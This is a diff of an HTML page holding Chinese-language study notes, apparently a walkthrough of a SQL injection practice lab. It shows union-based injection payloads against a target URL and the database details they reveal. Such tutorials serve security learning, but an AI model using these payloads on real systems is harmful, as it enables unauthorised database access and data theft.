@@ -556,7 +556,7 @@
 <p>对注入有检测，一般不存在注入漏洞</p>
 <p>（3）联合注入：<strong>union</strong>（将多个查询语句一起返回）</p>
 <ul>
-<li>猜解列名数量（字段数）：<strong>order   by   x</strong>  ：错误与正常的连接点</li>
+<li>猜解列名数量（字段数）：<code>**order   by   x**</code>  ：错误与正常的连接点</li>
 </ul>
 <img src="https://gitee.com/mie1732/emc/raw/master/img/202202282215475.png" alt="order by 1" style="zoom:67%;" />
 
@@ -566,11 +566,14 @@
 </ul>
 <p>order by先查询有几列数据，再union看几列数据可以显示出来，将能显示的替换替换成注入语句。</p>
 <p>此题2,3可以显示出来，即可以进行替换注入。</p>
-<p>219.153.49.228:47262/new_list.php?id=1 <strong>union select 1,2,3,4</strong></p>
-<p>219.153.49.228:47262/new_list.php?<strong>id=-1 union select 1,2,3,4</strong></p>
-<p>219.153.49.228:47262/new_list.php?id=1 <strong>and 1=2 union select 1,2,3,4</strong></p>
+<p><code>219.153.49.228:47262/new_list.php?id=1 union select 1,2,3,4</code></p>
+<p><code>219.153.49.228:47262/new_list.php?id=-1 union select 1,2,3,4</code></p>
+<p><code>219.153.49.228:47262/new_list.php?id=1 and 1=2 union select 1,2,3,4</code></p>
 <img src="https://gitee.com/mie1732/emc/raw/master/img/202202282246733.png" alt="报错" style="zoom:67%;" />
 
+<ul>
+<li>信息收集：</li>
+</ul>
 <p><strong>数据库版本：version( )</strong>                          5.7.22-0ubuntu0.16.04.1</p>
 <p><strong>数据库名字：database( )</strong>                          mozhe_Discuz_StormGroup</p>
 <p><strong>数据库用户：user( )</strong>                                root@localhost</p>
